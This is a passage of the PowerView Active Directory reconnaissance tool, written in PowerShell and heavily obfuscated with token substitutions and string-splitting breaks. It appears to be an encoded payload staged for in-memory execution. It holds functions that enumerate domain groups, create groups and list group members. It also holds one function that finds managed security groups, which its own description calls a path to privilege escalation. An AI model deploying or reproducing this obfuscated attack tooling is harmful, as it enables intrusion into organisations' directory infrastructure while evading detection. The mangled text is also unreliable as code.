        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = '+'[Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    BEGIN {
        gIF1SearcherArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[4'+'1aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credenti'+'al }
        gIF1GroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (gIF1GroupSearcher) {
            if (gIF1PSBoundParameters[41aMemberIdentity41a]) {

                if (gIF1SearcherArguments[41aProperties41a]) {
                    gIF1OldProperties = gIF1SearcherArguments[41aProperties41a]
                }

                gIF1SearcherArguments[41aIdentity41a] = gIF1MemberIdentity
                gIF1SearcherArguments[41aRaw41a] = gIF1True

                Get-DomainObject @SearcherArguments U9B ForEach-Object {
                    # convert the user/group to a directory entry
                    gIF1ObjectDirectoryEntry = gIF1_.GetDirectoryEntry()

                    # cause the cache to calculate the token groups for the user/group
                    gIF1ObjectDirectoryEntry.RefreshCache(41atokenGroups41a)

                    gIF1ObjectDirectoryEntry.TokenGroups U9B ForEach-Object {
                        # convert the token group sid
                        gIF1GroupSid = (New-Object System.Security.Principal.SecurityIdentifier(gIF1_,0)).Value

                        # ignore the built in groups
                        if (gIF1GroupSid -notmatch 41a^S-1-5-32-.*41a) {
                            gIF1SearcherArguments[41aIdentity41a] = gIF1GroupSid
                            gIF1SearcherArguments[41aRaw41a] = gIF1False
                            if (gIF1OldProperties) { gIF1SearcherArguments[41aProperties41a] = gIF1OldProperties }
                            gIF1Group = Get-DomainObject @SearcherArguments
                            if (gIF1Group) {
                                gIF1Group.PSObject.TypeNames.Insert(0, 41aPowerView.Group'+'41a)
                                gIF1Group
                            }
                        }
                    }
                }
            }
            else {
                gIF1IdentityFilter = 41a41a
                gIF1Filter = 41a41a
                gIF1Identity U9B Where-Object {gIF1_} U9B ForEach-Object {
                    gIF1IdentityInstance = gIF1_.Replace(41a(41a, 41aYwW2841a).Replace(41a)41a, 41aYwW2941a)
                    if (gIF1IdentityInstance -match 41a^S-1-41a) {
                        gIF1IdentityFilter += Zfr(objectsid=gIF1IdentityInstance)Zfr
                    }
                    elseif (gIF1IdentityInstance -match 41a^CN=41a) {
                        gIF1IdentityFilter += Zfr(distinguishedname=gIF1IdentityInstance)Zfr
                        if ((-not gIF1PSBoundParameters[41aDomain41a]) -and (-not gIF1PSBoundParameters[41aSearchBase41a])) {
                            # if a -Domain isn41at explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            gIF1IdentityDomain = gIF1IdentityInstance.SubString(gIF1IdentityInstance.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                            Write-Verbose Zfr[Get-DomainGroup] Extracted domain 41agIF1IdentityDomain41a from 41agIF1IdentityInstance41aZfr
                            gIF1SearcherArguments[41aDomain41a] = gIF1IdentityDomain
                            gIF1GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not gIF1GroupSearcher) {
                                Write-Warning Zfr[Get-DomainGroup] Unable to retrieve domain searcher for 41agIF1IdentityDomain41aZfr
                            }
                        }
                    }
                    elseif (gIF1IdentityInstance -imatch 41a^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}gIF141a) {
                        gIF1GuidByteString = (([Guid]gIF1IdentityInstance).ToByteArray() U9B ForEach-Object { 41aYwW41a + gIF1_.ToString(41aX241a) }) -join 41a41a
                        gIF1IdentityFilter += Zfr(objectguid=gIF1GuidByteString)Zfr
                    }
                    elseif (gIF1IdentityInstance.Contains(41aYwW41a)) {
                        gIF1ConvertedIdentityInstance = gIF1IdentityInstance.Replace(41aYwW2841a, 41a(41a).Replace(41aYwW2941a, 41a)41a) U9B Convert-ADName -OutputType Canonical
                        if (gIF1ConvertedIdentityInstance) {
                            gIF1GroupDomain = gIF1ConvertedIdentityInstance.SubString(0, gIF1ConvertedIdentityInstance.IndexOf(41a/41a))
                            gIF1GroupName = gIF1IdentityInstance.Split(41aYwW41a)[1]
                            gIF1IdentityFilter += Zfr(samAccountName=gIF1GroupName)Zfr
                            gIF1SearcherArguments[41aDomain41a] = gIF1GroupDomain
                            Write-Verbose Zfr[Get-DomainGroup] Extracted domain 41agIF1GroupDomain41a from 41agIF1IdentityInstance41aZfr
                            gIF1GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        gIF1IdentityFilter += Zfr(U9B(samAccountName=gIF1IdentityInstance)(name=gIF1IdentityInstance))Zfr
                    }
                }

                if (gIF1IdentityFilter -and (gIF1IdentityFilter.Trim() -ne 41a41a) ) {
                    gIF1Filter += Zfr(U9BgIF1IdentityFilter)Zfr
                }

                if (gIF1PSBoundParameters[41aAdminCount41a]) {
                    Write-Verbose 41a[Get-DomainGroup] Searching for adminCount=141a
                    gIF1Filter += 41a(admincount=1)41a
                }
                if (gIF1PSBoundParameters[41aGroupScope41a]) {
                    gIF1GroupScopeValue = gIF1PSBoundParameters[41aGroupScope41a]
                    gIF1Filter = Switch (gIF1GroupScopeValue) {
                        41aDomainLocal41a       { 41a(groupType:1.2.840.113556.1.4.803:=4)41a }
                        41aNotDomainLocal41a    { 41a(!(groupType:1.2.840.113556.1.4.803:=4))41a }
                        41aGlobal41a            { 41a(groupType:1.2.840.113556.1.4.803:=2)41a }
                        41aNotGlobal41a         { 41a(!(groupType:1.2.840.113556.1.4.803:=2))41a }
                        41aUniversal41a         { 41a(groupType:1.2.840.113556.1.4.803:=8)41a }
                        41aNotUniversal41a      { 41a(!(groupType:1.2.840.113556.1.4.803:=8))41a }
                    }
                    Write-Verbose Zfr[Get-DomainGroup] Searching for group scope 41agIF1GroupScopeValue41aZfr
                }
                if (gIF1PSBoundParameters[41aGroupProperty41a]) {
                    gIF1GroupPropertyValue = gIF1PSBoundParameters[41aGroupProperty41a]
                    gIF1Filter = Switch (gIF1GroupPropertyValue) {
                        41aSecurity41a              { 41a(groupType:1.2.840.113556.1.4.803:=2147483648)41a }
                        41aDistribution41a          { 41a(!(groupType:1.2.840.113556.1.4.803:=2147483648))41a }
                        41aCreatedBySystem41a       { 41a(groupType:1.2.840.113556.1.4.803:=1)41a }
                        41aNotCreatedBySystem41a    { 41a(!(groupType:1.2.840.113556.1.4.803:=1))41a }
                    }
                    Write-Verbose Zfr[Get-DomainGroup] Searching for group property 41agIF1GroupPropertyValue41aZfr
                }
                if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
                    Write-Verbose Zfr[Get-DomainGroup] Using additional LDAP filter: gIF1LDAPFilterZfr
                    gIF1Filter += ZfrgIF1LDAPFilterZfr
                }

                gIF1GroupSearcher.filter = Zfr(&(objectCategory=group)g'+'IF1Filter)Zfr
                Write-Verbose Zfr[Get-DomainGroup] filter string: gIF1(gIF1GroupSearcher.filter)Zfr

                if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1GroupSearcher.FindOne() }
                else { gIF1Results = gIF1GroupSearcher.FindAll() }
                gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                    if (gIF1PSBoundParameters[41aRaw41a]) {
                        # return raw result objects
                        gIF1Group = gIF1_
                    }
                    else {
                        gIF1Group = Convert-LDAPProperty -Properties gIF1_.Properties
                    }
                    gIF1Group.PSObject.TypeNames.Insert(0, 41aPowerView.Group41a)
                    gIF1Group
                }
                if (gIF1Results) {
                    try { gIF1Results.dispose() }
                    catch {
      '+'                  Write-Verbose Zfr[Get-DomainGr'+'oup] Error disposing of the Results objectZfr
                    }
                }
                gIF1GroupSearcher.dispose()
            }
        }
    }
}


function New-DomainGroup {
<#
.SYNOPSIS

Creates a new domain group (assuming appropriate permissions) and returns the group object.

TODO: implement all properties that New-ADGroup implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to create a new
DirectoryServices.AccountManagement.GroupPrincipal with the specified
group properties.

.PARAMETER SamAccountName

Specifies the Security Account Manager (SAM) account name of the group to create.
Maximum of 256 characters. Mandatory.

.PARAMETER Name

Specifies the name of the group to create. If not provided, defaults to SamAccountName.

.PARAMETER DisplayName

Specifies the display name of the group to create. If not provided, defaults to SamAccountName.

.PARAMETER Description

Specifies the description of the group to create.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

New-DomainGroup -SamAccountName TestGroup -Description 41aThis is a test group.41a

Creates the 41aTestGroup41a group with the specified description.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
New-DomainGroup -SamAccountName TestGroup -Description 41aThis is a test group.41a -Cred'+'ential gIF1Cred

Creates the 41aTestGroup41a group with the specified description using the specified alternate credentials.

'+'.OUTPUTS

DirectoryServices.AccountManagement.GroupPrincipal
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseSh'+'ouldProcessForStateChangingFunctions41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aDirectoryServices.AccountManagement.GroupPrincipal41a)]
    Param(
        [Parameter(Mandatory = gIF1True)]
        [ValidateLength(0, 256)]
        [String]
        gIF1SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Name,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Description,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    gIF1ContextArguments = @{
        41aIdentity41a = gIF1SamAccountName
    }
    if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ContextArguments[41aDomain41a] = gIF1Domain }
    i'+'f (gIF1PSBoundParameters[41aCredential41a]) { gIF1ContextArguments[41aCredential41a] = gIF1Credential }
    gIF1Context = Get-PrincipalContext @ContextArguments

    if (gIF1Context) {
        gIF1Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList (gIF1Context.Context)

        # set all the appropriate group parameters
        gIF1Group.SamAccountName = gIF1Context.Identity

        if (gIF1PSBoundParameters[41aName41a]) {
            gIF1Group.Name = gIF1Name
        }
        else {
            gIF1Group.Name = gIF1Context.Identity
        }
        if (gIF1PSBoundParameters[41aDisplayName41a]) {
            gIF1Group.DisplayName = gIF1DisplayName
        }
        else {
            gIF1Group.DisplayName = gIF1Context.Identity
        }

        if (gIF1PSBoundParameters[41aDescription41a]) {
            gIF1Group.Description = gIF1Description
        }

        Write-Verbose Zfr[New-DomainGroup] Attempting to create group 41agIF1SamAccountName41aZfr
        try {
            gIF1Null = gIF1Group.Save()
            Write-Verbose Zfr[New-DomainGroup] Group 41agIF1SamAccountName41a successfully createdZfr
            gIF1Group
        }
        catch {
            Write-Warning Zfr[New-DomainGroup] Error creating group 41agIF1SamAccountName41a : gIF1_Zfr
        }
    }
}


function Get-DomainManagedSecurityGroup {
<#
.SYNOPSIS

Returns all security groups in the current (or target) domain that have a manager set.

Author: Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>, Will Schroeder (@harmj0y)  
License: BSD '+'3-Clause  
Required Dependencies: Get-DomainObject, Get-DomainGroup, Get-DomainObjectAcl  

.DESCRIPTION

Authority to manipulate '+'the group membership of AD security groups and distribution groups
can be delegated to non-administrators by setting the 41amanagedBy41a attribute. This is typically
used to delegate management authority to distribution groups, but Windows supports security groups
being managed in the same way.

This function searches for AD groups which have a group manager set, and determines whether that
user can manipulate group membership. This could be a useful method of horizontal privilege
escalation, es'+'pecially if the manager can manipulate the membership of a privileged group.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainManagedSecurityGroup U9B Export-PowerViewCSV -NoTypeInformation group-managers.csv

Store a list of all security grou'+'ps with managers in group-managers.csv

.OUTPUTS

PowerView.ManagedSecurityGroup

A custom PSObject describing the managed security group.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.ManagedSecurityGroup41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aName41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Do'+'main,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRan'+'ge(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1SearcherArguments = @{
            41aLDAPFilter41a = 41a(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))41a
            41aProperties41a = 41adistinguishedName,managedBy,samaccounttype,samaccountname41a
        }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBound'+'Parameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aDomain41a]) {
            gIF1SearcherArguments[41aDomain41a] = gIF1Domain
            gIF1TargetDomain = gIF1Domain
        }
        else {
            gIF1TargetDomain = gIF1Env:USERDNSDOMAIN
        }

        # go through the list of security groups on the domain and identify those who have a manager
        Get-DomainGroup @SearcherArguments U9B ForEach-Object {
            gIF1SearcherArguments[41aProperties41a] = 41adistinguishedname,name,samaccounttype,samaccountname,objectsid41a
            gIF1SearcherArguments[41aIdentity41a] = gIF1_.managedBy
            gIF1Null = gIF1SearcherArguments.Remove(41aLDAPFilter41a)

            # gIF1SearcherArguments
            # retrieve the object that the managedBy DN refers to
            gIF1GroupManager = Get-DomainObject @SearcherArguments
            # Write-Host ZfrGroupManager: gIF1GroupManagerZfr
            gIF1ManagedGroup = New-Object PSObject
            gIF1ManagedGroup U9B Add-Member Noteproperty 41aGroupName41a gIF1_.samaccountname
            gIF1ManagedGroup U9B Add-Member Noteproperty 41aGroupDistinguishedName41a gIF1_.distinguishedname
            gIF1ManagedGroup U9B Add-Member Noteproperty 41aManagerName41a gIF1GroupManager.samaccountname
            gIF1ManagedGroup U9B Add-Member Noteproperty 41aManagerDistinguishedName41a gIF1GroupManager.distinguishedName

            # determine whether the manager is a user or a group
            if (gIF1GroupManager.samaccounttype -eq 0x10000000) {
                gIF1ManagedGroup U9B Add-Member Noteproperty 41aManagerType41a 41aGroup41a
            }
            elseif (gIF1GroupManager.samaccounttype -eq 0x30000000) {
                gIF1ManagedGroup U9B Add-Member Noteproperty 41aManagerType41a 41aUser41a
            }

            gIF1ACLArguments = @{
                41aIdentity41a = gIF1_.distinguishedname
                41aRightsFilter41a = 41aWriteMembers41a
            }
            if (gIF1PSBoundParameters[41aServer41a]) { gIF1ACLArguments[41aServer41a] = gIF1Server }
            if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1ACLArguments[41aSearchScope41a] = gIF1SearchScope }
            if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1ACLArguments[41aResultPageSize41a] = gIF1ResultPageSize }
            if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1ACLArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
            if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1ACLArguments[41aTombstone41a] = gIF1Tombstone }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ACLArguments[41aCredential41a] = gIF1Credential }

            # # TODO: correct!
            # # find the ACLs that relate to the ability to write to the group
            # gIF1xacl = Get-DomainObjectAcl @ACLArguments -Verbose
            # # gIF1ACLArguments
            # # double-check that the manager
            # if (gIF1xacl.ObjectType -eq 41abf9679c0-0de6-11d0-a285-00aa003049e241a -and gIF1xacl.AceType -eq 41aAccessAllowed41a -and (gIF1xacl.ObjectSid -eq gIF1GroupManager.objectsid)) {
            #     gIF1ManagedGroup U9B Add-Member Noteproperty 41aManagerCanWrite41a gIF1True
            # }
            # else {
            #     gIF1ManagedGroup U9B Add-Member Noteproperty 41aManagerCanWrite41a gIF1False
            # }

            gIF1ManagedGroup U9B Add-Member Noteproperty 41aManagerCanWrite41a 41aUNKNOWN41a

            gIF1ManagedGroup.PSObject.TypeNames.Insert(0, 41aPowerView.ManagedSecurityGroup41a)
            gIF1ManagedGroup
        }
    }
}


functio'+'n Get-DomainGroupMember {
<#
.SYNOPSIS

Return the members of a specific domain group.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGroup, Get-DomainGroupMember, Convert-ADName, Get-DomainObject, ConvertFrom-SID  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for the specified
group matching the criteria. Each result is then rebound and the full user
or group object is returned.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Recurse

Switch. If the group member is a group, recursively try to query its members as well.

.PARAMETER RecurseUsingMatchingRule

Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query to recurse.
Much faster than manual recursion, but doesn41at reveal cross-domain groups,
and only returns user accounts (no nested group objects themselves).

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGroupMember ZfrDesktop AdminsZfr

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

41aDesktop Admins41a U9B Get-DomainGroupMember -Recurse

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Testing Group
GroupDistinguishedName  : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroupMember -Domain testlab.local -Identity 41aDesktop Admins41a -RecurseUingMatchingRule

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroup *admin* -Properties samaccountna'+'me U9B Get-DomainGroupMember

.EXAMPLE

41aCN=Enterprise Admins,CN=Users,DC=testlab,DC=local41a, 41aDomain Admins41a U9B Get-DomainGroupMember

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainGroupMember -Credential gIF1Cred -Identity 41aDomain Admins41a

.EXAMPLE

Get-Domain U9B Select-Object -Expand name
testlab.local

41adevYwWdomain admins41a U9B Get-DomainGroupMember -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Extracted domain 41adev.testlab.local41a from 41adevYwWdomain admins41a
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Get'+'-DomainGroupMember filter string: (&(objectCategory=group)(U9B(samAccountName=domain admins)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(U9B(distinguishedname=CN=user1,CN=Users,DC=dev,DC=testlab,DC=local)))

GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : user1
MemberDistinguishedName : CN=user1,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-201108

VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-Dom'+'ainObject filter string: (&(U9B(distinguishedname=CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local)))
GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-500

.OUTPUTS

PowerView.GroupMember

Custom PSObject with translated group member property fields.

.LINK

http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDeclaredVarsMoreThanAssignments41a, 41a41a)]
    [OutputType(41aPowerView.GroupMember41a)]
    [CmdletBinding(DefaultParameterSetName = 41aNone41a)]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True, ValueFromP'+'ipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a, 41aMemberDistinguishedName41a, 41aMemberName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [Parameter(ParameterSetName = 41aManualRecurse41a)]
        [Switch]
        gIF1Recurse,

        [Parameter(ParameterSetName = 41aRecurseUsingMatchingRule41a)]
        [Switch]
        gIF1RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]'+'
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
